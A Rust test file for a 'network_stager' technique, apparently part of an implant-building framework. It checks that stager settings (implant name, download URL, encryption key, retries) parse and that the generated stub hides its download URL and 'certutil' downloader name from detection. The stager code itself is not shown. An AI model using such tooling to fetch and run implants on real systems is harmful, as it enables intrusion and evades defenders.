//! Tests for the network-stager control technique.

use super::{scp_port, scp_target, Params, DEF};
use crate::audit::strings::find_sensitive_literals_in_source;
use crate::engine::obfuscation::StringsConfig;
use crate::techniques::{Category, TechniqueKind};

#[test]
fn parses_minimal_params_with_defaults() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n",
    )
    .expect("network_stager should parse");
    assert_eq!(
        step,
        TechniqueKind::NetworkStager {
            params: Params {
                payload: "implant".to_string(),
                url: "https://example.invalid/a.bin".to_string(),
                crypto: super::StagerCrypto::None,
                key: None,
                nonce: None,
                timeout_ms: super::default_timeout_ms(),
                retries: 0,
            }
        }
    );
}

#[test]
fn parses_encrypted_params() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n  crypto: xchacha20poly1305\n  key: \"aa\"\n  nonce: \"bb\"\n  timeout_ms: 1000\n  retries: 2\n",
    )
    .expect("network_stager should parse");
    match step {
        TechniqueKind::NetworkStager { params } => {
            assert!(params.crypto.is_encrypted());
            assert_eq!(params.key.as_deref(), Some("aa"));
            assert_eq!(params.nonce.as_deref(), Some("bb"));
            assert_eq!(params.timeout_ms, 1000);
            assert_eq!(params.retries, 2);
        }
        other => panic!("expected network_stager, got {other:?}"),
    }
}

#[test]
fn def_is_well_formed() {
    assert_eq!(DEF.name, "network_stager");
    assert_eq!(DEF.category, Category::Control);
    assert_eq!(DEF.attck, &["T1105", "T1071"]);
    assert!(DEF.conflicts.is_empty());
    assert!(DEF.syscalls.is_empty());
    assert!(!DEF.stub_fragment.is_empty());
    assert!(!DEF.readme.is_empty());
}

#[test]
fn fragment_has_no_forbidden_patterns() {
    for forbidden in [
        "println!",
        "eprintln!",
        "unwrap(",
        "expect(",
        "todo!",
        "unimplemented!",
        "panic!",
        "anyhow",
    ] {
        assert!(
            !DEF.stub_fragment.contains(forbidden),
            "stub_fragment.rs must not contain '{forbidden}'"
        );
    }
}

#[test]
fn render_fragment_substitutes_every_placeholder_and_leaks_nothing() {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    let fragment = Params {
        payload: "implant".to_string(),
        url: "https://example.invalid/implant.bin".to_string(),
        crypto: super::StagerCrypto::XChaCha20Poly1305,
        key: Some("aa".to_string()),
        nonce: Some("bb".to_string()),
        timeout_ms: 30_000,
        retries: 1,
    }
    .render_fragment(&strings);

    assert!(fragment.contains("fn run_exec"), "run_exec missing");
    assert!(
        !fragment.contains('$'),
        "unsubstituted placeholder: {fragment}"
    );
    // The URL and the downloader name must not survive as quoted literals.
    assert!(
        !fragment.contains("\"example.invalid\""),
        "url literal leaked: {fragment}"
    );
    assert!(
        !fragment.contains("\"certutil\""),
        "download tool literal leaked: {fragment}"
    );
    assert!(find_sensitive_literals_in_source(&fragment).is_empty());
}

#[test]
fn scp_url_is_parsed_into_a_target_and_port() {
    assert_eq!(
        scp_target("scp://user@host:2222/path/implant.bin"),
        "user@host:path/implant.bin"
    );
    assert_eq!(scp_port("scp://user@host:2222/path/implant.bin"), "2222");
    assert_eq!(scp_target("scp://host/path"), "host:path");
    assert_eq!(scp_port("scp://host/path"), "");
}
